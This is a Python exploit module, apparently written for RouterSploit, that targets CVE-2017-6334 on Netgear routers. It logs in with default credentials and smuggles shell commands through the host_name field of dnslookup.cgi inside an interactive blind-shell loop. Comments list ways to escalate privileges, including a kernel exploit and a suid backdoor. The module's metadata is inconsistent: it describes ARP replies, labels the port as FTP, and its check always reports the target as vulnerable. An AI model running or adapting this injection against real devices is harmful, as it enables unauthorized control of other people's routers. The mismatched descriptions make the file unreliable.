
#Provides access to default user account, privileges can be easily elevated by using either:
# - a kernel exploit (ex. memodipper was tested and it worked)
# - by executing /bin/bd (suid backdoor present on SOME but not all versions)
# - by manipulating the httpd config files to trick the root user into executing your code (separate advisory will be released soon)
 
#Pozdrawiam: Kornela, Komara i Sknerusa

import sys
import requests
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

 
#You can change these credentials to ex. Gearguy/Geardog or Guest/Guest which are hardcoded on SOME firmware versions
#These routers DO NOT support telnet/ssh access so you can use this exploit to access the shell if you want to
 




class Exploit(HTTPClient):

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target FTP port")
    login = OptString("admin","Default username to log in")
    password = OptString("password","Default password to log in")

    __info__ = {

        "name": "cve_2017_6334",

        "description": "The vulnerability exists in the way the affected versions. "
                       "below handle ARP replies, if enough specially crafted ARP packets are sent "
                       "###########.",

        "authors": (

            "###",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "",

        ),

        "devices": (

            "netgear, cve_2017_6334"
        ),
    }



    
    def run(self):

        if self.check():
            print_success("Target seems to be vulnerable")
            if self.target != "":
                self.spawnShell()
            else:
                print_error("target is none")

     
    #def main():
        #if len(sys.argv) < 2:
            #print "./netgearpwn_2.py <router ip>"
            #return
        #spawnShell()

    def execute(self,cmd): #Escaping basic sanitization
        requests.post("http://" + self.target + "/dnslookup.cgi", data={'host_name':"www.google.com; " + cmd, 'lookup': "Lookup"}, auth=(self.login, self.password))
        return

    def spawnShell(self):
        print_status("Dropping a shell-like environment (blind OS injection)")
        print_status("To test it type 'reboot'")
        while True:
            cmd = input("[blind $] ")
            self.execute(cmd)
     
        else:
            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
        return True
        
    #if __name__ == "__main__":
        #main()

#2017-02-25 by SivertPL
#Tak, to ja.
